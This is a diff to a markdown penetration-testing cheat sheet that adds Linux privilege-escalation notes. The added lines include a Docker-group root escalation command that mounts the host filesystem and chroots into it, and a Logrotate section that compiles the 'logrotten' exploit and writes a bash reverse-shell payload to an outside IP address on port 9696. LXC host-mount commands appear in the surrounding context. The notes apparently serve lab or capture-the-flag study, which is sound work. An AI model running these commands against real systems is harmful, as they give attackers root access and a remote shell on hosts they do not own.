@@ -214,7 +214,10 @@ sed -n '/^Nmap scan report for/,/Service detection performed/p' Total_interal_nm
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b5aba6eb-1f3d-495e-bb01-0ebd1d8c2faa)
 
 ## Docker
-TO list dockers
+
+
+
+To list dockers
 ```
 docker ps
 ```
@@ -222,6 +225,18 @@ Get a shell in a docker from the list
 
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7c45185c-ee37-41a3-b044-6f811b0e834d)
 
+
+Get root when user is apart of docker group
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b4477ce3-b294-485e-8b44-a384431a6c35)
+
+
+Launches an Ubuntu Docker container with access to the entire host filesystem
+```
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+```
+-v /:/mnt: This option is used to mount the root directory (/) of the host system to the /mnt directory inside the container. This means that the entire host filesystem is accessible within the container.
 
 ## Containers
 
@@ -243,6 +258,30 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 lxc start privesc
 lxc exec privesc -- sh -c 'ls /mnt/root/root/'
 ```
+
+## Logrotate
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/dfdc9647-ccce-484b-ab7b-e89fed365177)
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7fbd5ee5-83ef-4614-8423-0d783a5a0b7c)
+
+```
+gcc logrotten.c -o logrotten
+```
+
+```
+echo 'bash -i >& /dev/tcp/10.10.14.24/9696 0>&1' > payload
+
+```
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a2b415cb-0844-4dcc-9619-d8ca9e0ff56d)
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b74f8e37-0bd5-4abe-91ff-fb136fe008f9)
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/d697b732-6b26-4a99-9d12-87a924c1ee5d)
+
 
 ## Linpeas
 
